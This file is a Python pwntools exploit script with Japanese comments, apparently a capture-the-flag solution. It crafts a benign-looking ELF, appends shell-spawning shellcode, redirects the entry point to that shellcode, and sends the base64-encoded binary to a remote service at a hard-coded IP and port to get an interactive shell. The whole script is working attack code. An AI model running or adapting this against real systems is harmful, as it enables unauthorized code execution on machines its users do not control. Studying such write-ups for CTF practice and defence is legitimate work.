from pwn import *
from base64 import b64encode

# NOTE: セグメントはプログラムをメモリにロードする際に参照する情報
# PF_WRITE フラグを落とすと実行不可能になる

# ロードの流れを追ったわけではないけど実験結果として、
# entrypoint からファイル末尾までがメモリに割り当てられてた
# （セグメント単位で切って配置するわけではない？）

# 無害な elf を作成して、末尾に exploit コードを追加
# そこに entrypoint を向ける

# 各フィールドのサイズ
# ref. https://en.wikipedia.org/wiki/Executable_and_Linkable_Format#Section_header

# ********************************************************
# exploit ファイルの生成
# ********************************************************
context.arch = 'amd64'

asm_code = """
    add [rax], al
"""
elf = ELF.from_assembly(asm_code)
elf_data = bytearray(elf.data)

# asm_code の場所を特定
section = elf.get_section_by_name(".shellcode")
offset = section.header.sh_offset
asm_len = len(asm(asm_code))
print(elf_data[offset : offset + asm_len])

# asm_code の後ろに exploit コードを追加
exploit_code = asm(shellcraft.sh())
elf_data[offset + asm_len : offset + asm_len + len(exploit_code)] = bytearray(exploit_code)

# entrypoint を exploit コードに向ける
ep = elf.header.e_entry
assert ep == unpack(elf_data[24:24+8])
elf_data[24:24+8] = pack(ep + asm_len)

# 保存
with open("exploit", "wb") as f:
    f.write(elf_data)

# ********************************************************
# 送信
# ********************************************************
# io = process(["python", "fairy.py"])
io = remote("20.84.72.194", 5003)

data = b64encode(open("exploit", "rb").read())
io.sendlineafter(b"!!", data)
io.interactive()
